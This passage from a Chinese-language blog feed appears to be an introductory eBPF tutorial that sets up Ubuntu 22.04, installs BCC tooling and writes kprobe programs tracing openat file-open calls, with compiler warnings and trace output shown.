include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>bpf(BPF_BTF_LOAD, &#123;btf=<span class="hljs-string">&quot;\237\353\1\0\30\0\0\0\0\0\0\0\230\2\0\0\230\2\0\0\315\t\0\0\0\0\0\0\0\0\0\2&quot;</span>..., btf_log_buf=NULL, btf_size=3197, btf_log_size=0, btf_log_level=0&#125;, 128) = 3<br>bpf(BPF_PROG_LOAD, &#123;prog_type=BPF_PROG_TYPE_KPROBE, insn_cnt=13, insns=[&#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x21&#125;, &#123;code=BPF_STX|BPF_H|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-4, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x646c726f&#125;, &#123;code=BPF_STX|BPF_W|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-8, imm=0&#125;, &#123;code=BPF_LD|BPF_DW|BPF_IMM, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x6c6c6548&#125;, &#123;code=BPF_LD|BPF_W|BPF_IMM, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x57202c6f&#125;, &#123;code=BPF_STX|BPF_DW|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-16, imm=0&#125;, &#123;code=BPF_ALU64|BPF_X|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_10, off=0, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_ADD, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0xfffffff0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_2, src_reg=BPF_REG_0, off=0, imm=0xe&#125;, &#123;code=BPF_JMP|BPF_K|BPF_CALL, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x6&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;, &#123;code=BPF_JMP|BPF_K|BPF_EXIT, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;], license=<span class="hljs-string">&quot;GPL&quot;</span>, log_level=0, log_size=0, log_buf=NULL, kern_version=KERNEL_VERSION(5, 15, 74), prog_flags=0, prog_name=<span class="hljs-string">&quot;hello_world&quot;</span>, prog_ifindex=0, expected_attach_type=BPF_CGROUP_INET_INGRESS, prog_btf_fd=3, func_info_rec_size=8, func_info=0x55cd34bb8700, func_info_cnt=1, line_info_rec_size=16, line_info=0x55cd34b42800, line_info_cnt=5, attach_btf_id=0, attach_prog_fd=0, fd_array=NULL&#125;, 128) = 4<br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.168992: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169022: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169047: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169050: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006685: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006702: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193472: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193486: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193711: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193712: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193806: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193807: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193900: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193902: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257082: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257119: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506782: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506819: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757435: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757476: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006600: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006637: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.203999: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204040: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204324: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204347: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204729: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.205191: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.205215: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] d...1 27979.212232: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] dN..1 27979.212317: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257070: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257121: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257315: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257323: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257356: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257357: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257426: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257428: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257496: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257497: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257515: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257516: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257626: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257627: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257699: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257700: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257717: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257732: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257733: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257748: bpf_trace_printk: Hello, World!&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】first try2</title>
    <link href="/2023/01/29/ebpf/%E3%80%90ebpf%E3%80%91first%20try2/"/>
    <url>/2023/01/29/ebpf/%E3%80%90ebpf%E3%80%91first%20try2/</url>
    
    <content type="html"><![CDATA[<h2 id="虚拟机基本环境信息"><a href="#虚拟机基本环境信息" class="headerlink" title="虚拟机基本环境信息"></a>虚拟机基本环境信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br><br></code></pre></td></tr></table></figure><p>搭建ubuntu虚拟机可以看到我的另一篇教程：<br><a href="https://blog.csdn.net/weixin_42072280/article/details/128351846?spm=1001.2014.3001.5501"># 【网络成长记】VMware16.2.2中创建ubuntu22.04.1虚拟机+修改静态ip+换源+mobaxterm远程连接+修改命令提示符颜色</a></p><h2 id="安装-eBPF-开发和运行所需要的开发工具"><a href="#安装-eBPF-开发和运行所需要的开发工具" class="headerlink" title="安装 eBPF 开发和运行所需要的开发工具"></a>安装 eBPF 开发和运行所需要的开发工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># sudo apt-get install -y make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span><br></code></pre></td></tr></table></figure><h2 id="ebpf的CO-RE特性前提条件"><a href="#ebpf的CO-RE特性前提条件" class="headerlink" title="ebpf的CO-RE特性前提条件"></a>ebpf的CO-RE特性前提条件</h2><p>在使用 CO-RE 之前，内核需要开启 CONFIG_DEBUG_INFO_BTF&#x3D;y 和 CONFIG_DEBUG_INFO&#x3D;y 这两个编译选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /boot/config-5.15.0-58-generic  |grep -i config_debug_info</span><br>CONFIG_DEBUG_INFO=y<br><span class="hljs-comment"># CONFIG_DEBUG_INFO_REDUCED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_COMPRESSED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_SPLIT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF4 is not set</span><br>CONFIG_DEBUG_INFO_DWARF5=y<br>CONFIG_DEBUG_INFO_BTF=y<br>CONFIG_DEBUG_INFO_BTF_MODULES=y<br>[root@ubuntu-22 ~]<span class="hljs-comment">#</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ll /sys/kernel/btf/vmlinux</span><br>-r--r--r-- 1 root root 5178563  1月 29 16:02 /sys/kernel/btf/vmlinux<br><br></code></pre></td></tr></table></figure><h2 id="第一个ebpf程序：跟踪-openat-（即打开文件）系统调用"><a href="#第一个ebpf程序：跟踪-openat-（即打开文件）系统调用" class="headerlink" title="第一个ebpf程序：跟踪 openat()（即打开文件）系统调用"></a>第一个ebpf程序：跟踪 openat()（即打开文件）系统调用</h2><h3 id="第一步：使用-C-开发一个-eBPF-程序"><a href="#第一步：使用-C-开发一个-eBPF-程序" class="headerlink" title="第一步：使用 C 开发一个 eBPF 程序"></a>第一步：使用 C 开发一个 eBPF 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.c</span><br>int hello_world(void *ctx)<br>&#123;<br>    bpf_trace_printk(<span class="hljs-string">&quot;Hello, World!&quot;</span>);  // 最常用的 BPF 辅助函数，它的作用是输出一段字符串。不过，由于 eBPF 运行在内核中，它的输出并不是通常的标准输出（stdout），而是内核调试文件 /sys/kernel/debug/tracing/trace_pipe<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// eBPF程序并不能随便的调用内核函数，必须通过辅助函数才可完成eBPF程序和其他内核模块的交互，eg bpf_trace_printk()<br><br></code></pre></td></tr></table></figure><h3 id="第二步：使用-Python-和-BCC-库开发一个用户态程序"><a href="#第二步：使用-Python-和-BCC-库开发一个用户态程序" class="headerlink" title="第二步：使用 Python 和 BCC 库开发一个用户态程序"></a>第二步：使用 Python 和 BCC 库开发一个用户态程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.py</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># 1) import bcc library</span><br><span class="hljs-comment"># 导入了 BCC  库的 BPF 模块，以便接下来调用；</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 2) load BPF program</span><br><span class="hljs-comment"># 调用 BPF() 加载第一步开发的 BPF 源代码；</span><br>b = BPF(src_file=<span class="hljs-string">&quot;hello.c&quot;</span>)<br><br><span class="hljs-comment"># 3) attach kprobe</span><br><span class="hljs-comment"># 将 BPF 程序挂载到内核探针（简称 kprobe），其中 do_sys_openat2() 是系统调用 openat() 在内核中的实现；</span><br><span class="hljs-comment"># 调用了 attach_kprobe 函数，绑定了一个内核跟踪事件</span><br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><br><span class="hljs-comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span><br><span class="hljs-comment"># 读取内核调试文件 /sys/kernel/debug/tracing/trace_pipe 的内容，并打印到标准输出中。</span><br>b.trace_print()<br><br><br><span class="hljs-comment"># 内核函数 do_sys_openat2</span><br><br><span class="hljs-comment"># 理解：opennat()和opennat2()都是系统调用</span><br><span class="hljs-comment"># 在计算机中运行程序、读写文件，都会涉及到文件的打开操作，Linux v5.10 与文件打开相关的系统调用有 open() / creat() / openat() / openat2这四类，在使用 glibc v2.32 时，几乎所有的文件打开操作使用的都是 openat2() 这个系统调用。</span><br><br><span class="hljs-comment"># 用高级语言开发的 eBPF 程序，需要首先编译为 BPF 字节码，然后借助 bpf 系统调用加载到内核中，最后再通过性能监控等接口与具体的内核事件进行绑定。这样，内核的性能监控模块才会在内核事件发生时，自动执行我们开发的 eBPF 程序。</span><br></code></pre></td></tr></table></figure><h3 id="第三步：执行-eBPF-程序"><a href="#第三步：执行-eBPF-程序" class="headerlink" title="第三步：执行 eBPF 程序"></a>第三步：执行 eBPF 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693212: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693407: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246610: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246653: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246911: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247487: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247529: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248757: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248848: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249767: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249825: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.251964: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.252028: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253499: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253554: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7271.943581: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7272.943654: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.267842: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.268730: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272320: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272921: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.273573: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.274131: bpf_trace_printk: Hello, World!&#x27;</span><br><br><br></code></pre></td></tr></table></figure><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.c</span><br>// 包含头文件<br><span class="hljs-comment">#include &lt;uapi/linux/openat2.h&gt;</span><br><span class="hljs-comment">#include &lt;linux/sched.h&gt;</span><br><br>// 定义数据结构<br>struct data_t &#123;<br>  u32 pid;<br>  u64 ts;<br>  char <span class="hljs-built_in">comm</span>[TASK_COMM_LEN];<br>  char fname[NAME_MAX];<br>&#125;;<br><br>// 定义性能事件映射  定义一个 Perf 事件类型的 BPF 映射<br>BPF_PERF_OUTPUT(events);<br><br><br><br>// 定义kprobe处理函数<br>int hello_world(struct pt_regs *ctx, int dfd, const char __user * filename, struct open_how *how)<br>&#123;<br>  struct data_t data = &#123; &#125;;<br><br>  // 获取PID和时间<br>  data.pid = bpf_get_current_pid_tgid();  // bpf_get_current_pid_tgid用于获取进程的 TGID 和 PID。因为这儿定义的 data.pid 数据类型为 u32，所以高 32 位舍弃掉后就是进程的 PID<br>  data.ts = bpf_ktime_get_ns();  // bpf_ktime_get_ns用于获取系统自启动以来的时间，单位是纳秒<br><br>  // 获取进程名<br>  <span class="hljs-keyword">if</span> (bpf_get_current_comm(&amp;data.comm, sizeof(data.comm)) == 0)  // bpf_get_current_comm用于获取进程名，并把进程名复制到预定义的缓冲区中<br>  &#123;<br>    bpf_probe_read(&amp;data.fname, sizeof(data.fname), (void *)filename); // bpf_probe_read 用于从指定指针处读取固定大小的数据，这里则用于读取进程打开的文件名。<br>  &#125;<br><br>  // 提交性能事件 调用 perf_submit() 把数据提交到刚才定义的 BPF 映射<br>  events.perf_submit(ctx, &amp;data, sizeof(data));<br>  <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.py</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 1) load BPF program</span><br><span class="hljs-comment"># 加载 eBPF 